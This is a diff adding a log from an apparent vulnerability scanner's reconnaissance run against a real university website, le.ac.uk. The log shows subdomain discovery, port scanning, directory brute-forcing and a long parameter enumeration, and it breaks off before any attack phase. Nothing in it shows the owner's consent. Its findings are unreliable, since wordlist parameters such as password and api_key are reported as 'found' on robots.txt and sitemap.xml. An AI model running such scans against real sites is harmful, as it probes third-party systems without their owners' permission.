@@ -1,0 +1,924 @@
+[04:07:01] [INFO] Loaded 45 subdomains, 52 directories, 96 parameters
+[04:07:01] [INFO] Initialized 9 attack patterns
+[04:07:01] [INFO] ╔══════════════════════════════════════════════════════════════════╗
+[04:07:01] [INFO] ║  🚀 VANGUARD SECURITY SCANNER v2.0 - ENTERPRISE EDITION           ║
+[04:07:01] [INFO] ║  🔍 COMPREHENSIVE VULNERABILITY ASSESSMENT PLATFORM              ║
+[04:07:01] [INFO] ║  ⚡ MAX CONCURRENT REQUESTS: 30                                ║
+[04:07:01] [INFO] ║  🎯 CONFIDENCE THRESHOLD: 75%                                 ║
+[04:07:01] [INFO] ╚══════════════════════════════════════════════════════════════════╝
+[04:07:29] [INFO] ╔══════════════════════════════════════════════════════════════════╗
+[04:07:29] [INFO] ║  🚀 VANGUARD SCAN INITIATED: https://le.ac.uk/                            ║
+[04:07:29] [INFO] ║  📊 MAX CRAWL DEPTH: 10                                           ║
+[04:07:29] [INFO] ║  ⚡ MAX CONCURRENT: 30                                          ║
+[04:07:29] [INFO] ╚══════════════════════════════════════════════════════════════════╝
+[04:07:29] [PHASE: Reconnaissance] Starting reconnaissance phase
+[04:07:29] [INFO] Enumerating subdomains...
+[04:07:34] [DEBUG] Found subdomain: shop.le.ac.uk (HTTP)
+[04:07:35] [DEBUG] Found subdomain: shop.le.ac.uk (HTTPS)
+[04:07:35] [DEBUG] Found subdomain: www.le.ac.uk (HTTP)
+[04:07:35] [DEBUG] Found subdomain: www.le.ac.uk (HTTPS)
+[04:07:37] [DEBUG] Found subdomain: webmail.le.ac.uk (HTTP)
+[04:07:39] [DEBUG] Found subdomain: webmail.le.ac.uk (HTTPS)
+[04:07:51] [INFO] Discovered 6 subdomains
+[04:07:51] [INFO] Performing port scan...
+[04:07:52] [DEBUG] Open port: le.ac.uk:80
+[04:08:13] [DEBUG] Open port: le.ac.uk:443
+[04:08:55] [INFO] Found 2 open ports
+[04:08:55] [INFO] Detecting technologies...
+[04:08:56] [INFO] Technologies detected: React, ASP.NET, Java, Vue.js, Angular
+[04:08:56] [INFO] Brute forcing directories...
+[04:08:58] [DEBUG] Found directory: https://le.ac.uk/media (OK)
+[04:08:59] [DEBUG] Found directory: https://le.ac.uk/modules (OK)
+[04:08:59] [DEBUG] Found directory: https://le.ac.uk/library (OK)
+[04:08:59] [INFO] Discovered 3 directories
+[04:08:59] [SUCCESS] Reconnaissance complete. Found 9 initial targets
+[04:08:59] [PHASE: Discovery] Starting discovery phase
+[04:09:00] [INFO] Discovered 0 API endpoints
+[04:09:03] [DEBUG] Found sitemap: https://le.ac.uk/sitemap.xml
+[04:09:05] [DEBUG] Found robots.txt: https://le.ac.uk/robots.txt
+[04:09:08] [INFO] Discovered 0 common files
+[04:09:08] [SUCCESS] Discovery complete. Total targets: 14
+[04:09:08] [PHASE: Crawling] Starting crawling phase
+[04:09:08] [DEBUG] Extracted 0 URLs from https://le.ac.uk/robots.txt
+[04:09:08] [DEBUG] Extracted 1251 URLs from https://le.ac.uk/modules
+[04:09:08] [DEBUG] Extracted 26 URLs from https://le.ac.uk/tagmanagertest
+[04:09:08] [DEBUG] Extracted 26 URLs from https://le.ac.uk/regression-testing-area
+[04:09:08] [DEBUG] Extracted 1328 URLs from https://le.ac.uk/media
+[04:09:08] [DEBUG] Extracted 101 URLs from http://webmail.le.ac.uk
+[04:09:09] [DEBUG] Extracted 101 URLs from https://webmail.le.ac.uk
+[04:09:09] [DEBUG] Extracted 1 URLs from https://le.ac.uk/sitemap.xml
+[04:09:09] [DEBUG] Extracted intelligence from https://shop.le.ac.uk: 2 emails, 0 phones, 0 secrets
+[04:09:09] [DEBUG] Extracted 433 URLs from https://shop.le.ac.uk
+[04:09:09] [DEBUG] Extracted 1443 URLs from https://www.le.ac.uk
+[04:09:09] [DEBUG] Extracted intelligence from http://shop.le.ac.uk: 2 emails, 0 phones, 0 secrets
+[04:09:09] [DEBUG] Extracted 433 URLs from http://shop.le.ac.uk
+[04:09:09] [DEBUG] Extracted 1378 URLs from https://le.ac.uk/library
+[04:09:09] [DEBUG] Extracted 1 URLs from https://le.ac.uk/website.xml
+[04:09:09] [DEBUG] Extracted 1443 URLs from http://www.le.ac.uk
+[04:09:09] [INFO] Extracting new URLs from crawled pages...
+[04:09:09] [DEBUG] Extracted 26 URLs from https://le.ac.uk/tagmanagertest
+[04:09:09] [DEBUG] Extracted 101 URLs from https://webmail.le.ac.uk
+[04:09:09] [DEBUG] Extracted 433 URLs from http://shop.le.ac.uk
+[04:09:09] [DEBUG] Extracted 0 URLs from https://le.ac.uk/robots.txt
+[04:09:09] [DEBUG] Extracted 433 URLs from https://shop.le.ac.uk
+[04:09:09] [DEBUG] Extracted 26 URLs from https://le.ac.uk/regression-testing-area
+[04:09:09] [DEBUG] Extracted 101 URLs from http://webmail.le.ac.uk
+[04:09:09] [DEBUG] Extracted 1378 URLs from https://le.ac.uk/library
+[04:09:09] [DEBUG] Extracted 1251 URLs from https://le.ac.uk/modules
+[04:09:09] [DEBUG] Extracted 1443 URLs from http://www.le.ac.uk
+[04:09:09] [DEBUG] Extracted 1443 URLs from https://www.le.ac.uk
+[04:09:09] [DEBUG] Extracted 1328 URLs from https://le.ac.uk/media
+[04:09:09] [DEBUG] Extracted 1 URLs from https://le.ac.uk/website.xml
+[04:09:09] [DEBUG] Extracted 1 URLs from https://le.ac.uk/sitemap.xml
+[04:09:09] [INFO] Extracted 0 new URLs
+[04:09:09] [SUCCESS] Crawling complete. Crawled 14 pages
+[04:09:09] [PHASE: ParameterEnumeration] Starting parameter enumeration
+[04:09:10] [DEBUG] Discovered parameter: id on https://le.ac.uk/robots.txt
+[04:09:10] [DEBUG] Discovered parameter: id on https://webmail.le.ac.uk
+[04:09:10] [DEBUG] Discovered parameter: user on https://le.ac.uk/robots.txt
+[04:09:10] [DEBUG] Discovered parameter: id on http://webmail.le.ac.uk
+[04:09:10] [DEBUG] Discovered parameter: username on https://le.ac.uk/robots.txt
+[04:09:10] [DEBUG] Discovered parameter: user on https://le.ac.uk/library
+[04:09:10] [DEBUG] Discovered parameter: id on https://le.ac.uk/sitemap.xml
+[04:09:10] [DEBUG] Discovered parameter: user on https://webmail.le.ac.uk
+[04:09:10] [DEBUG] Discovered parameter: password on https://le.ac.uk/robots.txt
+[04:09:10] [DEBUG] Discovered parameter: user on https://shop.le.ac.uk
+[04:09:10] [DEBUG] Discovered parameter: email on https://le.ac.uk/robots.txt
+[04:09:10] [DEBUG] Discovered parameter: user on http://webmail.le.ac.uk
+[04:09:10] [DEBUG] Discovered parameter: user on http://www.le.ac.uk
+[04:09:10] [DEBUG] Discovered parameter: username on https://webmail.le.ac.uk
+[04:09:10] [DEBUG] Discovered parameter: user on https://le.ac.uk/sitemap.xml
+[04:09:10] [DEBUG] Discovered parameter: mail on https://le.ac.uk/robots.txt
+[04:09:10] [DEBUG] Discovered parameter: user on http://shop.le.ac.uk
+[04:09:10] [DEBUG] Discovered parameter: username on https://le.ac.uk/sitemap.xml
+[04:09:10] [DEBUG] Discovered parameter: phone on https://le.ac.uk/robots.txt
+[04:09:10] [DEBUG] Discovered parameter: user on https://le.ac.uk/modules
+[04:09:10] [DEBUG] Discovered parameter: password on https://webmail.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: username on http://webmail.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: id on https://le.ac.uk/website.xml
+[04:09:11] [DEBUG] Discovered parameter: mobile on https://le.ac.uk/robots.txt
+[04:09:11] [DEBUG] Discovered parameter: password on https://le.ac.uk/sitemap.xml
+[04:09:11] [DEBUG] Discovered parameter: username on https://shop.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: name on https://le.ac.uk/robots.txt
+[04:09:11] [DEBUG] Discovered parameter: user on https://www.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: email on https://webmail.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: email on https://le.ac.uk/sitemap.xml
+[04:09:11] [DEBUG] Discovered parameter: firstname on https://le.ac.uk/robots.txt
+[04:09:11] [DEBUG] Discovered parameter: username on https://le.ac.uk/modules
+[04:09:11] [DEBUG] Discovered parameter: password on http://webmail.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: mail on https://le.ac.uk/sitemap.xml
+[04:09:11] [DEBUG] Discovered parameter: lastname on https://le.ac.uk/robots.txt
+[04:09:11] [DEBUG] Discovered parameter: mail on https://webmail.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: address on https://le.ac.uk/robots.txt
+[04:09:11] [DEBUG] Discovered parameter: username on http://shop.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: city on https://le.ac.uk/robots.txt
+[04:09:11] [DEBUG] Discovered parameter: password on https://le.ac.uk/modules
+[04:09:11] [DEBUG] Discovered parameter: user on https://le.ac.uk/media
+[04:09:11] [DEBUG] Discovered parameter: phone on https://webmail.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: phone on https://le.ac.uk/sitemap.xml
+[04:09:11] [DEBUG] Discovered parameter: password on https://shop.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: email on http://webmail.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: state on https://le.ac.uk/robots.txt
+[04:09:11] [DEBUG] Discovered parameter: mobile on https://le.ac.uk/sitemap.xml
+[04:09:11] [DEBUG] Discovered parameter: zip on https://le.ac.uk/robots.txt
+[04:09:11] [DEBUG] Discovered parameter: user on https://le.ac.uk/website.xml
+[04:09:11] [DEBUG] Discovered parameter: email on https://le.ac.uk/modules
+[04:09:11] [DEBUG] Discovered parameter: mobile on https://webmail.le.ac.uk
+[04:09:11] [DEBUG] Discovered parameter: name on https://le.ac.uk/sitemap.xml
+[04:09:12] [DEBUG] Discovered parameter: mail on http://webmail.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: country on https://le.ac.uk/robots.txt
+[04:09:12] [DEBUG] Discovered parameter: name on https://webmail.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: firstname on https://le.ac.uk/sitemap.xml
+[04:09:12] [DEBUG] Discovered parameter: token on https://le.ac.uk/robots.txt
+[04:09:12] [DEBUG] Discovered parameter: username on https://www.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: email on https://shop.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: username on http://www.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: auth on https://le.ac.uk/robots.txt
+[04:09:12] [DEBUG] Discovered parameter: lastname on https://le.ac.uk/sitemap.xml
+[04:09:12] [DEBUG] Discovered parameter: phone on http://webmail.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: firstname on https://webmail.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: password on http://shop.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: session on https://le.ac.uk/robots.txt
+[04:09:12] [DEBUG] Discovered parameter: username on https://le.ac.uk/website.xml
+[04:09:12] [DEBUG] Discovered parameter: address on https://le.ac.uk/sitemap.xml
+[04:09:12] [DEBUG] Discovered parameter: username on https://le.ac.uk/media
+[04:09:12] [DEBUG] Discovered parameter: key on https://le.ac.uk/robots.txt
+[04:09:12] [DEBUG] Discovered parameter: password on https://www.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: lastname on https://webmail.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: mobile on http://webmail.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: city on https://le.ac.uk/sitemap.xml
+[04:09:12] [DEBUG] Discovered parameter: secret on https://le.ac.uk/robots.txt
+[04:09:12] [DEBUG] Discovered parameter: mail on https://le.ac.uk/modules
+[04:09:12] [DEBUG] Discovered parameter: mail on https://shop.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: apikey on https://le.ac.uk/robots.txt
+[04:09:12] [DEBUG] Discovered parameter: state on https://le.ac.uk/sitemap.xml
+[04:09:12] [DEBUG] Discovered parameter: address on https://webmail.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: phone on https://le.ac.uk/modules
+[04:09:12] [DEBUG] Discovered parameter: api_key on https://le.ac.uk/robots.txt
+[04:09:12] [DEBUG] Discovered parameter: name on http://webmail.le.ac.uk
+[04:09:12] [DEBUG] Discovered parameter: zip on https://le.ac.uk/sitemap.xml
+[04:09:13] [DEBUG] Discovered parameter: password on https://le.ac.uk/website.xml
+[04:09:13] [DEBUG] Discovered parameter: email on http://shop.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: city on https://webmail.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: access_token on https://le.ac.uk/robots.txt
+[04:09:13] [DEBUG] Discovered parameter: country on https://le.ac.uk/sitemap.xml
+[04:09:13] [DEBUG] Discovered parameter: firstname on http://webmail.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: refresh_token on https://le.ac.uk/robots.txt
+[04:09:13] [DEBUG] Discovered parameter: phone on https://shop.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: password on http://www.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: state on https://webmail.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: token on https://le.ac.uk/sitemap.xml
+[04:09:13] [DEBUG] Discovered parameter: csrf on https://le.ac.uk/robots.txt
+[04:09:13] [DEBUG] Discovered parameter: email on https://www.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: auth on https://le.ac.uk/sitemap.xml
+[04:09:13] [DEBUG] Discovered parameter: csrf_token on https://le.ac.uk/robots.txt
+[04:09:13] [DEBUG] Discovered parameter: email on https://le.ac.uk/website.xml
+[04:09:13] [DEBUG] Discovered parameter: zip on https://webmail.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: lastname on http://webmail.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: xsrf on https://le.ac.uk/robots.txt
+[04:09:13] [DEBUG] Discovered parameter: session on https://le.ac.uk/sitemap.xml
+[04:09:13] [DEBUG] Discovered parameter: username on https://le.ac.uk/library
+[04:09:13] [DEBUG] Discovered parameter: country on https://webmail.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: mail on http://shop.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: xsrf_token on https://le.ac.uk/robots.txt
+[04:09:13] [DEBUG] Discovered parameter: key on https://le.ac.uk/sitemap.xml
+[04:09:13] [DEBUG] Discovered parameter: address on http://webmail.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: mobile on https://shop.le.ac.uk
+[04:09:13] [DEBUG] Discovered parameter: jwt on https://le.ac.uk/robots.txt
+[04:09:14] [DEBUG] Discovered parameter: token on https://webmail.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: secret on https://le.ac.uk/sitemap.xml
+[04:09:14] [DEBUG] Discovered parameter: bearer on https://le.ac.uk/robots.txt
+[04:09:14] [DEBUG] Discovered parameter: password on https://le.ac.uk/library
+[04:09:14] [DEBUG] Discovered parameter: file on https://le.ac.uk/robots.txt
+[04:09:14] [DEBUG] Discovered parameter: mail on https://le.ac.uk/website.xml
+[04:09:14] [DEBUG] Discovered parameter: apikey on https://le.ac.uk/sitemap.xml
+[04:09:14] [DEBUG] Discovered parameter: city on http://webmail.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: auth on https://webmail.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: filename on https://le.ac.uk/robots.txt
+[04:09:14] [DEBUG] Discovered parameter: password on https://le.ac.uk/media
+[04:09:14] [DEBUG] Discovered parameter: api_key on https://le.ac.uk/sitemap.xml
+[04:09:14] [DEBUG] Discovered parameter: email on https://le.ac.uk/library
+[04:09:14] [DEBUG] Discovered parameter: path on https://le.ac.uk/robots.txt
+[04:09:14] [DEBUG] Discovered parameter: firstname on https://shop.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: session on https://webmail.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: url on https://le.ac.uk/robots.txt
+[04:09:14] [DEBUG] Discovered parameter: access_token on https://le.ac.uk/sitemap.xml
+[04:09:14] [DEBUG] Discovered parameter: state on http://webmail.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: email on https://le.ac.uk/media
+[04:09:14] [DEBUG] Discovered parameter: phone on http://shop.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: uri on https://le.ac.uk/robots.txt
+[04:09:14] [DEBUG] Discovered parameter: phone on https://le.ac.uk/website.xml
+[04:09:14] [DEBUG] Discovered parameter: key on https://webmail.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: mobile on https://le.ac.uk/modules
+[04:09:14] [DEBUG] Discovered parameter: redirect on https://le.ac.uk/robots.txt
+[04:09:14] [DEBUG] Discovered parameter: zip on http://webmail.le.ac.uk
+[04:09:14] [DEBUG] Discovered parameter: refresh_token on https://le.ac.uk/sitemap.xml
+[04:09:14] [DEBUG] Discovered parameter: return on https://le.ac.uk/robots.txt
+[04:09:15] [DEBUG] Discovered parameter: secret on https://webmail.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: lastname on https://shop.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: firstname on https://le.ac.uk/modules
+[04:09:15] [DEBUG] Discovered parameter: callback on https://le.ac.uk/robots.txt
+[04:09:15] [DEBUG] Discovered parameter: mail on https://le.ac.uk/library
+[04:09:15] [DEBUG] Discovered parameter: action on https://le.ac.uk/robots.txt
+[04:09:15] [DEBUG] Discovered parameter: csrf on https://le.ac.uk/sitemap.xml
+[04:09:15] [DEBUG] Discovered parameter: country on http://webmail.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: apikey on https://webmail.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: mobile on https://le.ac.uk/website.xml
+[04:09:15] [DEBUG] Discovered parameter: mail on https://www.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: method on https://le.ac.uk/robots.txt
+[04:09:15] [DEBUG] Discovered parameter: csrf_token on https://le.ac.uk/sitemap.xml
+[04:09:15] [DEBUG] Discovered parameter: mobile on http://shop.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: phone on https://le.ac.uk/library
+[04:09:15] [DEBUG] Discovered parameter: api_key on https://webmail.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: address on https://shop.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: token on http://webmail.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: type on https://le.ac.uk/robots.txt
+[04:09:15] [DEBUG] Discovered parameter: xsrf on https://le.ac.uk/sitemap.xml
+[04:09:15] [DEBUG] Discovered parameter: mode on https://le.ac.uk/robots.txt
+[04:09:15] [DEBUG] Discovered parameter: phone on https://www.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: access_token on https://webmail.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: xsrf_token on https://le.ac.uk/sitemap.xml
+[04:09:15] [DEBUG] Discovered parameter: name on https://le.ac.uk/website.xml
+[04:09:15] [DEBUG] Discovered parameter: status on https://le.ac.uk/robots.txt
+[04:09:15] [DEBUG] Discovered parameter: lastname on https://le.ac.uk/modules
+[04:09:15] [DEBUG] Discovered parameter: auth on http://webmail.le.ac.uk
+[04:09:15] [DEBUG] Discovered parameter: jwt on https://le.ac.uk/sitemap.xml
+[04:09:15] [DEBUG] Discovered parameter: error on https://le.ac.uk/robots.txt
+[04:09:16] [DEBUG] Discovered parameter: refresh_token on https://webmail.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: city on https://shop.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: bearer on https://le.ac.uk/sitemap.xml
+[04:09:16] [DEBUG] Discovered parameter: msg on https://le.ac.uk/robots.txt
+[04:09:16] [DEBUG] Discovered parameter: city on https://le.ac.uk/modules
+[04:09:16] [DEBUG] Discovered parameter: firstname on http://shop.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: session on http://webmail.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: csrf on https://webmail.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: message on https://le.ac.uk/robots.txt
+[04:09:16] [DEBUG] Discovered parameter: file on https://le.ac.uk/sitemap.xml
+[04:09:16] [DEBUG] Discovered parameter: mobile on https://le.ac.uk/library
+[04:09:16] [DEBUG] Discovered parameter: state on https://le.ac.uk/modules
+[04:09:16] [DEBUG] Discovered parameter: debug on https://le.ac.uk/robots.txt
+[04:09:16] [DEBUG] Discovered parameter: firstname on https://le.ac.uk/website.xml
+[04:09:16] [DEBUG] Discovered parameter: filename on https://le.ac.uk/sitemap.xml
+[04:09:16] [DEBUG] Discovered parameter: csrf_token on https://webmail.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: test on https://le.ac.uk/robots.txt
+[04:09:16] [DEBUG] Discovered parameter: key on http://webmail.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: firstname on https://le.ac.uk/library
+[04:09:16] [DEBUG] Discovered parameter: path on https://le.ac.uk/sitemap.xml
+[04:09:16] [DEBUG] Discovered parameter: admin on https://le.ac.uk/robots.txt
+[04:09:16] [DEBUG] Found 50 parameters on https://le.ac.uk/robots.txt
+[04:09:16] [DEBUG] Discovered parameter: xsrf on https://webmail.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: url on https://le.ac.uk/sitemap.xml
+[04:09:16] [DEBUG] Discovered parameter: email on http://www.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: secret on http://webmail.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: lastname on https://le.ac.uk/website.xml
+[04:09:16] [DEBUG] Discovered parameter: state on https://shop.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: lastname on http://shop.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: xsrf_token on https://webmail.le.ac.uk
+[04:09:16] [DEBUG] Discovered parameter: uri on https://le.ac.uk/sitemap.xml
+[04:09:17] [DEBUG] Discovered parameter: zip on https://le.ac.uk/modules
+[04:09:17] [DEBUG] Discovered parameter: redirect on https://le.ac.uk/sitemap.xml
+[04:09:17] [DEBUG] Discovered parameter: jwt on https://webmail.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: apikey on http://webmail.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: return on https://le.ac.uk/sitemap.xml
+[04:09:17] [DEBUG] Discovered parameter: mail on http://www.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: address on https://le.ac.uk/website.xml
+[04:09:17] [DEBUG] Discovered parameter: callback on https://le.ac.uk/sitemap.xml
+[04:09:17] [DEBUG] Discovered parameter: zip on https://shop.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: bearer on https://webmail.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: api_key on http://webmail.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: mobile on https://www.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: action on https://le.ac.uk/sitemap.xml
+[04:09:17] [DEBUG] Discovered parameter: address on http://shop.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: file on https://webmail.le.ac.uk
+[04:09:17] [DEBUG] Discovered parameter: method on https://le.ac.uk/sitemap.xml
+[04:09:17] [DEBUG] Discovered parameter: country on https://le.ac.uk/modules
+[04:09:17] [DEBUG] Discovered parameter: access_token on http://webmail.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: type on https://le.ac.uk/sitemap.xml
+[04:09:18] [DEBUG] Discovered parameter: filename on https://webmail.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: country on https://shop.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: city on https://le.ac.uk/website.xml
+[04:09:18] [DEBUG] Discovered parameter: firstname on https://www.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: token on https://le.ac.uk/modules
+[04:09:18] [DEBUG] Discovered parameter: mode on https://le.ac.uk/sitemap.xml
+[04:09:18] [DEBUG] Discovered parameter: path on https://webmail.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: refresh_token on http://webmail.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: status on https://le.ac.uk/sitemap.xml
+[04:09:18] [DEBUG] Discovered parameter: auth on https://le.ac.uk/modules
+[04:09:18] [DEBUG] Discovered parameter: url on https://webmail.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: auth on https://shop.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: error on https://le.ac.uk/sitemap.xml
+[04:09:18] [DEBUG] Discovered parameter: state on https://le.ac.uk/website.xml
+[04:09:18] [DEBUG] Discovered parameter: csrf on http://webmail.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: city on http://shop.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: session on https://le.ac.uk/modules
+[04:09:18] [DEBUG] Discovered parameter: msg on https://le.ac.uk/sitemap.xml
+[04:09:18] [DEBUG] Discovered parameter: uri on https://webmail.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: message on https://le.ac.uk/sitemap.xml
+[04:09:18] [DEBUG] Discovered parameter: key on https://le.ac.uk/modules
+[04:09:18] [DEBUG] Discovered parameter: redirect on https://webmail.le.ac.uk
+[04:09:18] [DEBUG] Discovered parameter: csrf_token on http://webmail.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: debug on https://le.ac.uk/sitemap.xml
+[04:09:19] [DEBUG] Discovered parameter: zip on https://le.ac.uk/website.xml
+[04:09:19] [DEBUG] Discovered parameter: session on https://shop.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: secret on https://le.ac.uk/modules
+[04:09:19] [DEBUG] Discovered parameter: return on https://webmail.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: test on https://le.ac.uk/sitemap.xml
+[04:09:19] [DEBUG] Discovered parameter: xsrf on http://webmail.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: state on http://shop.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: admin on https://le.ac.uk/sitemap.xml
+[04:09:19] [DEBUG] Found 50 parameters on https://le.ac.uk/sitemap.xml
+[04:09:19] [DEBUG] Discovered parameter: callback on https://webmail.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: phone on http://www.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: key on https://shop.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: action on https://webmail.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: xsrf_token on http://webmail.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: country on https://le.ac.uk/website.xml
+[04:09:19] [DEBUG] Discovered parameter: method on https://webmail.le.ac.uk
+[04:09:19] [DEBUG] Discovered parameter: mail on https://le.ac.uk/media
+[04:09:19] [DEBUG] Discovered parameter: jwt on http://webmail.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: zip on http://shop.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: type on https://webmail.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: secret on https://shop.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: phone on https://le.ac.uk/media
+[04:09:20] [DEBUG] Discovered parameter: mode on https://webmail.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: bearer on http://webmail.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: token on https://le.ac.uk/website.xml
+[04:09:20] [DEBUG] Discovered parameter: status on https://webmail.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: apikey on https://shop.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: file on http://webmail.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: apikey on https://le.ac.uk/modules
+[04:09:20] [DEBUG] Discovered parameter: error on https://webmail.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: country on http://shop.le.ac.uk
+[04:09:20] [DEBUG] Discovered parameter: auth on https://le.ac.uk/website.xml
+[04:09:20] [DEBUG] Discovered parameter: mobile on http://www.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: filename on http://webmail.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: msg on https://webmail.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: api_key on https://shop.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: message on https://webmail.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: path on http://webmail.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: debug on https://webmail.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: lastname on https://le.ac.uk/library
+[04:09:21] [DEBUG] Discovered parameter: session on https://le.ac.uk/website.xml
+[04:09:21] [DEBUG] Discovered parameter: auth on http://shop.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: access_token on https://shop.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: test on https://webmail.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: url on http://webmail.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: city on https://le.ac.uk/library
+[04:09:21] [DEBUG] Discovered parameter: admin on https://webmail.le.ac.uk
+[04:09:21] [DEBUG] Found 52 parameters on https://webmail.le.ac.uk
+[04:09:21] [DEBUG] Discovered parameter: uri on http://webmail.le.ac.uk
+[04:09:22] [DEBUG] Discovered parameter: firstname on http://www.le.ac.uk
+[04:09:22] [DEBUG] Discovered parameter: key on https://le.ac.uk/website.xml
+[04:09:22] [DEBUG] Discovered parameter: refresh_token on https://shop.le.ac.uk
+[04:09:22] [DEBUG] Discovered parameter: session on http://shop.le.ac.uk
+[04:09:22] [DEBUG] Discovered parameter: redirect on http://webmail.le.ac.uk
+[04:09:22] [DEBUG] Discovered parameter: state on https://le.ac.uk/library
